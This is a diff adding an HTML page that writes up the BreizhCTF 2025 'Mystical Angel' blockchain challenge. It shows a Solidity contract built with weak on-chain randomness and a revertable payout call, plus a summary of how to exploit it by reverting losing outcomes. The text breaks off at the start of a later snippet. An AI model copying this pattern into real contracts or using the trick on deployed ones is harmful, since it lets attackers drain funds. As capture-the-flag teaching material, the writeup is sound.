@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Mystical angel writeup, BreizhCTF 2025.">  
+  <meta property="og:description" content="Mystical angel writeup, BreizhCTF 2025." />
+  <meta property="og:image" content="https://i.imgflip.com/9nrcre.jpg" />
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  
+  <title>
+    
+      BreizhCTF 2025 - Mystical Angel [blockchain]
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.4383c9a9fef9c691bf251ef6911270170922f3ca49fa37b7cfb8e9e4ca5071324135852848c3484ffa8fd4aeec60397bc3ca792092781f5f2dff9bc6fcd4e221.css" integrity="sha512-Q4PJqf75xpG/JR72kRJwFwki88pJ&#43;je3z7jp5MpQcTJBNYUoSMNIT/qP1K7sYDl7w8p5IJJ4H18t/5vG/NTiIQ==" />
+  
+</head>
+
+    <body a="dark">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">~/</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2025-03-18 11:03:54 &#43;0100 CET">
+            2025-03-18
+        </time>
+    </p>
+
+    <h1>BreizhCTF 2025 - Mystical Angel [blockchain]</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#code-reading">Code reading</a></li>
+      </ul>
+    </li>
+    <li><a href="#solving">Solving</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <p><strong>Mystical angel</strong> writeup, BreizhCTF 2025.</p>
+<blockquote>
+<p>Difficulty : Easy</p></blockquote>
+<blockquote>
+<p>Team : So what if I&rsquo;m a Phreaks 2600</p></blockquote>
+<blockquote>
+<p>Description : Lors de votre périple, vous rencontrez un ange numérique qui vous propose des bénédictions à condition que vous trouvez à quel chiffre l&rsquo;ange pense. <br> <br> Après 10 bénédictions, vous pourrez vous élever et atteindre les sommets du paradis. Malheureusement, si vous échouez une fois, votre compteur se remet à 0. <br> <br> Trouvez une moyen de gagner ces 10 bénédictions.</p></blockquote>
+<blockquote>
+<p>Author : <a href="https://x.com/Clemhate2">K.L.M</a></p></blockquote>
+<h1 id="tldr">TL;DR</h1>
+<ul>
+<li>You need 10 blessings to get the flag and there are 50% chance of getting a blessing. If you&rsquo;re unlucky and don&rsquo;t get a blessing, you lose all your blessings.</li>
+<li>Requesting a blessing cost you ether, but if you actually get a blessing, you get it back. Otherwise you lose it.</li>
+<li>Notice that when getting blessed or not, a call to the fallback function is made with 1 ether if you get blessed and 0 ether if not.</li>
+<li>Set a condition to cancel the transaction when getting 0 ether after request a blessing, so you can only get blessed.</li>
+<li>Get 10 blessings and get the flag.</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>For this challenge, we have to interact with a contract and get <strong>blessed</strong> 10 times by contacting <code>Blessing()</code>. But, there&rsquo;s a 50/50 chance to not get blessed and lose all the blessings we have gathered.</p>
+<p>After collecting them all, we can call &ldquo;ascend()&rdquo; to solve the challenge.</p>
+<p>Here is the source code :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">Challenge.sol</summary>
+  <div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">93
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// Author : K.L.M 
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// Difficulty : Easy
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#ff7b72">pragma solidity</span> <span style="color:#ff7b72;font-weight:bold">^</span><span style="color:#a5d6ff">0</span>.<span style="color:#a5d6ff">8</span>.<span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> __  __           _   _           _                             _ 
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> |  \/  |         | | (_)         | |     /\                    | |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> | \  / |_   _ ___| |_ _  ___ __ _| |    /  \   _ __   __ _  ___| |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> | |\/| | | | / __| __| |/ __/ _` | |   / /\ \ | &#39;_ \ / _` |/ _ \ |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> | |  | | |_| \__ \ |_| | (_| (_| | |  / ____ \| | | | (_| |  __/ |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> |_|  |_|\__, |___/\__|_|\___\__,_|_| /_/    \_\_| |_|\__, |\___|_|
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">          __/ |                                        __/ |       
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">         |___/                                        |___/        
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">       .-&#34;&#34;-.                     .-&#34;&#34;-.
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">     .&#39;_.-.  |                   |  .-._&#39;.
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">    /    _/ /       _______       \ \_    \
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   /.--.&#39; | |      `=======`      | | &#39;.--.\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">  /   .-`-| |       ,ooooo,       | |-`-.   \
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> ;.--&#39;:   | |     .d88888/8b.     | |   :&#39;--.;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|    _\.&#39;-| |    d8888888/888b    | |-&#39;./_    |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">;_.-&#39;/:   | |   d8888P&#34;`  &#39;Y88b   | |   :\&#39;-._;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|   | _:-&#39;\  \.d88(` ^ _ ^  )88b./  /&#39;-:_ |   |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">;  .:` &#39;._ \.d88888\   _   /88888b / _.&#39; `:.  ;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">|-` &#39;-.;_ .d88888888b.___.d8888888b.` _;.-&#39; `-|
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">; / .&#39;\ | 888888888P&#39;    &#39;Y888888888b&#39;| /&#39;. \ ;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">| .&#39; / `&#39;.8888888P&#39; `&#34;---&#34;` &#39;Y88888888&#39;` \ &#39;. |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">;/  /\_/-`Y888888|           |8888888P-\_/\  \;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> |.&#39; .| `; Y88888| |       | |888888P;` |. &#39;.|
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"> |  / \.&#39;\_/Y8888| :--&#34;&#34;&#34;--: |8888P`_/&#39;./ \  |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">  \| ; | ; |/8888| |       | |8888\| : | ; |/
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   \ | ; | /d8888\.&#39;-.....-&#39;./8888b\ | ; | /
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">    `\ | |`d8888P&#39; / ;|: | \ &#39;Y88888`| | /`
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">     .-:_/ Y8;=&#39; .&#39; / &#39; . : &#39;. &#39;888P`\_:&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">     |  \```      .&#39;  ;     \    `:
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">      \  \                   &#39;     `&#39;.
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   .--&#39;\  |  &#39;         &#39;       .      `-._
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">  /`;--&#39; /_.&#39;          .                  `-.
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">  |  `--`        /               \           \
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">   \       .&#39;   &#39;                 &#39;-.        |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">    \   &#39;               &#39;          __\       |
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">     &#39;.      .                 _.-&#39;  `)     /
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">       &#39;-._                _.-&#39; `| .-`   _.&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">           `&#39;--....____.--&#39;|     (`  _.-&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">                    /  | |  \     `&#34;`
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">                    \__/ \__/
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">As a traveler, you came across a mystical angel who can bless you. Try to get 10 blessings from the angel to ascend to the heavens.
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">*/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">contract</span> <span style="color:#f0883e;font-weight:bold">Challenge</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">bool</span> <span style="color:#ff7b72">public</span> solved <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">uint256</span> <span style="color:#ff7b72">private</span> seed;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">mapping</span>(<span style="color:#ff7b72">address</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#ff7b72">uint256</span>) <span style="color:#ff7b72">public</span> blessings;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">event</span> <span style="color:#f0883e;font-weight:bold">Blessed</span>(<span style="color:#ff7b72">address</span> <span style="color:#ff7b72">indexed</span> sender);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">event</span> <span style="color:#f0883e;font-weight:bold">Ascended</span>(<span style="color:#ff7b72">address</span> <span style="color:#ff7b72">indexed</span> sender);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">constructor</span>() <span style="color:#ff7b72">payable</span>{
+</span></span><span style="display:flex;"><span>        require(msg.value <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">2</span> <span style="color:#79c0ff">ether</span>, <span style="color:#a5d6ff">&#34;Insufficient funds&#34;</span>);
+</span></span><span style="display:flex;"><span>        seed <span style="color:#ff7b72;font-weight:bold">=</span> block.timestamp;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">Blessing</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">payable</span> {
+</span></span><span style="display:flex;"><span>        require(msg.value <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span>, <span style="color:#a5d6ff">&#34;You must pay the right to get your blessing&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">uint256</span> randomNumber <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">uint256</span>(keccak256(abi.encodePacked(seed, msg.sender, block.prevrandao, block.timestamp)));
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">uint256</span> AngelNumber <span style="color:#ff7b72;font-weight:bold">=</span> randomNumber <span style="color:#ff7b72;font-weight:bold">%</span> <span style="color:#a5d6ff">2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (AngelNumber <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span>) {
+</span></span><span style="display:flex;"><span>            (<span style="color:#ff7b72">bool</span> sent, ) <span style="color:#ff7b72;font-weight:bold">=</span> msg.sender.call{value<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">1</span> <span style="color:#79c0ff">ether</span>}(<span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>            require(sent, <span style="color:#a5d6ff">&#34;Failed to send Ether&#34;</span>);
+</span></span><span style="display:flex;"><span>            blessings[msg.sender] <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> (AngelNumber <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            (<span style="color:#ff7b72">bool</span> sent, ) <span style="color:#ff7b72;font-weight:bold">=</span> msg.sender.call{value<span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#a5d6ff">0</span> <span style="color:#79c0ff">ether</span>}(<span style="color:#a5d6ff">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>            require(sent, <span style="color:#a5d6ff">&#34;Failed to send Ether&#34;</span>);
+</span></span><span style="display:flex;"><span>            blessings[msg.sender] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">ascend</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">payable</span> {
+</span></span><span style="display:flex;"><span>        require(blessings[msg.sender] <span style="color:#ff7b72;font-weight:bold">&gt;=</span> <span style="color:#a5d6ff">10</span>,<span style="color:#a5d6ff">&#34;You have not proved your worthiness :((&#34;</span>);
+</span></span><span style="display:flex;"><span>        solved <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">function</span> <span style="color:#d2a8ff;font-weight:bold">isSolved</span>() <span style="color:#ff7b72">public</span> <span style="color:#ff7b72">view</span> <span style="color:#ff7b72">returns</span> (<span style="color:#ff7b72">bool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> solved;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<h2 id="code-reading">Code reading</h2>
+<p>We can notice in the <code>Blessing()</code> function, that to get a blessing, <code>AngelNumber</code> have to be equal to 1 :</p>
+<div class="highlight"><div style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#737679">5
